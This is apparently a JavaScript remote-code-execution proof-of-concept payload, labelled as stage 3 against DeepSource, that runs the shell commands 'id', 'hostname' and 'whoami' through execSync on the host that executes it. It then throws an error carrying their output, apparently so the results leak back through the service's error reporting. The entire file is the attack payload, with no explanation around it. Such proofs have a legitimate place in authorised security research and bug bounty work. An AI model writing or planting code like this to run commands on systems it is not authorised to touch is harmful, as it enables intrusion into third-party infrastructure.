// DEEPSOURCE-STAGE-3: command output proof
const { execSync } = require("child_process");
const run = (cmd) => execSync(cmd, { timeout: 5000 }).toString().trim();
const id     = run("id");
const host   = run("hostname");
const whoami = run("whoami");
throw new Error("DEEPSOURCE-RCE-PROOF id=" + id + " hostname=" + host + " whoami=" + whoami);
